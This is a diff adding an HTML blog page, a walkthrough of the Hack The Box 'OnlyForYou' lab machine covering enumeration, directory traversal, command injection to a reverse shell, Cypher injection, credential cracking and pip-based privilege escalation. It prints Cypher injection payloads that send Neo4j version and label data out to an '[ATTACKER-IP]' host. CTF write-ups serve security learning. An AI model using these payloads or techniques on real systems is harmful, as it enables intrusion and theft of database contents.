@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>HTB OnlyForYou Writeup</title>
+
+  <meta name="description" content="HTB OnlyForYou Writeup">
+  <meta name="author" content="Bruno-1337">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB OnlyForYou Writeup">
+  <meta name="twitter:description" content="HTB OnlyForYou Writeup">
+  <meta name="twitter:creator" content="Bruno-1337">  
+  <meta name="twitter:image" content="https://www.hackthebox.com/storage/avatars/5147467f5bb0d84eff614fd4ef2f7c23.png" />
+
+  <meta property="og:site_name" content="Bruno-1337" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="HTB OnlyForYou Writeup">
+  <meta property="og:description" content="HTB OnlyForYou Writeup">
+  <meta property="og:image" content="https://www.hackthebox.com/storage/avatars/5147467f5bb0d84eff614fd4ef2f7c23.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://www.hackthebox.com/storage/avatars/5147467f5bb0d84eff614fd4ef2f7c23.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup OnlyForYou" href="/feed.xml">
+</head>
+
+
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.gif)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.gif" class="user-image zoomable" alt="Bruno-1337">
+          <h1 class="panel-cover__title panel-title scale-up-center">Bruno 1337</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">CTF Writeups</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="HackTheBox_Writeups" class="blog-button">HackTheBox Writeups</a></li>
+              <li class="navigation__item grow"><a href="/" title="Home" class="blog-button">Home</a></li>
+            </ul>
+          </nav>
+
+          
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+             <li class="navigation__item grow">
+                <a href="https://github.com/bruno-1337" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/brunobadaro" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+              
+              <li class="navigation__item grow">
+                <a href="mailto:bruno@waifu.club" title="Emai" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+    
+  </div>
+
+  <header class="post-header slide-top">
+   
+    <head>
+<style>
+body {
+  background-color: #000000;
+  color: #FFFFFF;
+  font-family: Calibri, Sans Serif;
+}
+
+.darkMode{
+  background-color: #ffffff;
+  color: #000000;
+}
+
+</style>
+</head>
+<body>
+<button id="darkModeToggle">☀️ Light Mode</button>
+
+
+<script>
+  const darkModeToggle = document.querySelector('#darkModeToggle');
+  
+  darkModeToggle.addEventListener('click', () => {
+    document.body.classList.toggle('darkMode')
+  })
+  
+</script>
+
+</body>
+    <br>
+    <picture><img src="https://www.hackthebox.com/storage/avatars/5147467f5bb0d84eff614fd4ef2f7c23.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+   
+  </header>
+
+
+<br>
+<br>          
+<h1 id="HackTheBox-OnlyForYou">HTB - OnlyForYou</h1>
+<p>This is a writeup/walkthrough of the Hack the Box machine "OnlyForYou"</p>
+<p><img src="img/banner.png" alt=""></p> <!--foto do lab-->
+<p>Machine Link :  <a href="https://app.hackthebox.com/machines/540">https://app.hackthebox.com/machines/540</a></p>
+<p>Machine IP : 10.10.11.210</p>
+<h1 id="-prerequisites-"><strong>Enumeration</strong></h1>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+  <code><span class="ve">❯ command </span><span class="p">used
+  sudo nmap -sV -sC -o nmap 10.10.11.210
+    </span>
+</code></pre></div></div><br> 
+<p><img src="img/nmap.png" alt=""></p>
+<p><strong>Scan Result:</strong></p>
+<p>22 tcp open port for ssh</p>
+<p>80 tcp open port for http</p>
+
+<p><strong>Enumerating Subdomains:</strong></p>
+<p>After adding the line 10.10.11.210 only4you.htb to our hosts file we can see the webpage</p>
+<p><img src="img/firstlook.png" alt=""></p>
+<p>after looking for a bit at the website we start FUFF to fuzz for vhosts</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+  <code><span class="ve">❯ command </span><span class="p">used
+  ffuf -w seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "HOST: FUZZ.only4you.htb" -u http://only4you.htb/ -fs 178
+    </span>
+</code></pre></div></div><br> 
+<p><img src="img/ffufvhost.png" alt=""></p>
+<p>We found beta.only4you.htb/</p>
+<p><img src="img/beta.png" alt=""></p>
+<p>We proceed to download the source code provided</p>
+<p><img src="img/sourcecode.png" alt=""></p>
+<p>After taking a look at the source code we went to the endpoints mentioned, we find that after uploading a file, we are redirected to beta.only4you.htb/list where we have some buttons to download the resized image</p>
+<p><img src="img/list.png" alt=""></p>
+<p>When analyzing the request that we make when we click the button to download the resized image we find a Directory Traversal Vulnerability</p>
+<p><img src="img/directorytraversal.png" alt=""></p>
+<p>After fuzzing for a bit we find in the website directory (/var/www/only4you.htb/) the file app.py, just like the sourcecode we downloaded before, but after inspection we find</p>
+<div style="overflow:auto;position:relative;margin-bottom: 1em;background:#151515;color:#d0d0d0;font-family:Monaco,Consolas,monospace;font-size:1.0em;line-height:1.8;border-radius:4px;"><pre style="background:#151515;border:none;"><span style="color:#aa759f">from</span> <span style="color:#aa759f">form</span> <span style="color:#aa759f">import</span> <span style="color:#d0d0d0;background-color:#151515">sendmessage</span></pre></div>
+<p>Which is not present in the provided source code, so we proceed to request the file form.py</p>
+<p><img src="img/form.png" alt=""></p>
+<p>This is the form mentioned in the code</p>
+<p><img src="img/formpage.png" alt=""></p>
+<p>After analyzing the sourcecode we find that the issecure function is vulnerable to code injection when it runs dig on user input</p>
+<p><img src="img/insecure.png" alt=""></p>
+<p>We proceed to setup a listener and create a reverse shell payload</p>
+<p><img src="img/www-datashell.png" alt=""></p>
+<p>After enumerating the machine for a bit we find that there are some ports in use but not open to the network</p>
+<p>So we proceed to port forward them to our machine with chisel</p>
+<p>port 3000: gogs server (git server)</p>
+<p>port 7474: Neo4j</p>
+<p>port 8001: Unknown Login page</p>
+<p>After searching for a bit we find that the login page on port 8001 have weak credentials and we can login with admin:admin</p>
+<p><img src="img/8001login.png" alt=""></p>
+<p>At the employees page we find a search bar thats vulnerable to cypher injection</p>
+<p><img src="img/cypherin.png" alt=""></p>
+<p>We first get the software version with the query:</p>
+<div style="overflow:auto;position:relative;margin-bottom: 1em;background:#151515;color:#d0d0d0;font-family:Monaco,Consolas,monospace;font-size:1.0em;line-height:1.8;border-radius:4px;"><pre style="background:#151515;border:none;"><span style="color:#90a959">' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM '</span><span style="color:#d0d0d0;background-color:#151515">http</span><span style="color:#d0d0d0">:</span><span style="color:#d0d0d0">//</span><span style="color:#d0d0d0">[</span><span style="color:#d0d0d0;background-color:#151515">ATTACKER</span><span style="color:#d0d0d0">-</span><span style="color:#d0d0d0;background-color:#151515">IP</span><span style="color:#d0d0d0">]</span><span style="color:#d0d0d0">/?</span><span style="color:#aa759f">version</span><span style="color:#d0d0d0">=</span><span style="color:#90a959">' + version + '</span><span style="color:#d0d0d0">&amp;</span><span style="color:#d0d0d0;background-color:#151515">name</span><span style="color:#d0d0d0">=</span><span style="color:#90a959">' + name + '</span><span style="color:#d0d0d0">&amp;</span><span style="color:#d0d0d0;background-color:#151515">edition</span><span style="color:#d0d0d0">=</span><span style="color:#90a959">' + edition as l RETURN 0 as _0 // </span></pre></div>
+<p>After confirming that the search bar is vulnerable we proceed to exploitation</p>
+<p>Cypher Injection:  <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j">https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j</a></p>
+<p>We enumerate labels first:</p>
+<div style="overflow:auto;position:relative;margin-bottom: 1em;background:#151515;color:#d0d0d0;font-family:Monaco,Consolas,monospace;font-size:1.0em;line-height:1.8;border-radius:4px;"><pre style="background:#151515;border:none;"><span style="color:#90a959">' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM '</span><span style="color:#d0d0d0;background-color:#151515">http</span><span style="color:#d0d0d0">:</span><span style="color:#d0d0d0">//</span><span style="color:#d0d0d0">[</span><span style="color:#d0d0d0;background-color:#151515">ATTACKER</span><span style="color:#d0d0d0">-</span><span style="color:#d0d0d0;background-color:#151515">IP</span><span style="color:#d0d0d0">]</span><span style="color:#d0d0d0">/?=</span><span style="color:#90a959">'label as l RETURN 0 as _0 // </span></pre></div>
+<p><img src="img/labels.png" alt=""></p> 
+<p>We then get the keys of the users label</p>
+<p><img src="img/keysquery.png" alt=""></p>
+<p>Then we crack the hashes</p>
+<p><img src="img/hashes.png" alt=""></p>
+<p>admin:admin</p>
+<p>john:ThisIs4You</p>
+<p>We then login on SSH with john:ThisIs4You</p>
+<h1 id="-prerequisites-"><strong>Privesc</strong></h1>
+<p><img src="img/sudo-l.png" alt=""></p>
+<p>sudo -l shows that we can execute /usr/bin/pip install http://127.0.0.1:3000/*tar.gz</p>
+<p>That means we can install any python package with root privileges if we download it from the gogs server</p>
+<p>We proceed to upload a malicious pip package on the gogs server so we can exploit this</p>
+<p>Malicious Pip Package:  <a href="https://github.com/bruno-1337/piprivesc">https://github.com/bruno-1337/piprivesc</a></p>
+<p><img src="img/uploadpiprivesc.png" alt=""></p>
+<p>Dont forget to set the repository public</p>
+<p><img src="img/public.png" alt=""></p>
+<p>We then install the package and we get root!</p>
+<p><img src="img/root.png" alt=""></p>
+<p><img src="img/owned.png" alt=""></p>
+<h1 id="thanks-for-reading-">Thanks For Reading!</h1>
+
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - Bruno-1337</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
